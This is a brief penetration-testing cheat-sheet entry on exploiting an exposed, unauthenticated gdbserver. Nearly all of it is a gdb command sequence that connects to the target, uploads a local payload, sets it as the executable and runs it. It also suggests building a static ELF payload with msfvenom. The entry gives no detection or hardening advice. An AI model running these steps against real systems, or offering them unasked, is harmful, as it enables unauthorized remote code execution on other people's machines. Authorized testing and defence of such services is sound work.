# Exposed gdbserver Remote Code Execution

An unauthenticated `gdbserver` listening on a TCP port is a direct remote-execution primitive.

```bash
gdb
(gdb) target extended-remote <TARGET>:<PORT>
(gdb) remote put <local-static-elf-payload> /path/on/target/payload
(gdb) set remote exec-file /path/on/target/payload
(gdb) run
```
A statically-linked payload (e.g. `msfvenom ... -f elf`) avoids dependency issues on the target.
